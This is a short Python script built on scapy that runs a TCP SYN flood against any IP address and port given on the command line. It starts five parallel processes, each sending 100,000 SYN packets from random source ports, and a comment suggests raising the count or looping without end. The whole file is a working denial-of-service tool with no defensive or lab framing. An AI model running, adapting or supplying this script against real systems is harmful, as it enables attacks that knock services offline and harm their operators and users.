from scapy.all import *
import sys
from multiprocessing import Pool

# attack to a specific target and from specific source ip
def synFloodAttack(target_ip, dest_port, sent_packets):
	ip=IP(dst=target_ip)   
	tcp = TCP(sport=RandShort(), dport=dest_port, flags="S")
	p = ip/tcp
	#increase this number or create a while loop on attack
	send(p, count=sent_packets, verbose=0)

def attack(target_ip, dest_port):
	sent_packets = 100000
	print("START")
	synFloodAttack(target_ip, dest_port, sent_packets)
	print("Sent " + str(sent_packets) + " packets")

if __name__ == "__main__":
	# required ip addres and port
	if len(sys.argv) != 3:
		print("few arguments")
		sys.exit(1)
		
	target_ip = sys.argv[1]
	dest_port = int(sys.argv[2])
	
	print("starting SYN flood attack on "+target_ip+":"+str(dest_port))
	pool = Pool(processes=5)
	for _ in range(5):
		pool.apply_async(attack, args=(target_ip, dest_port))
	pool.close()
	pool.join()
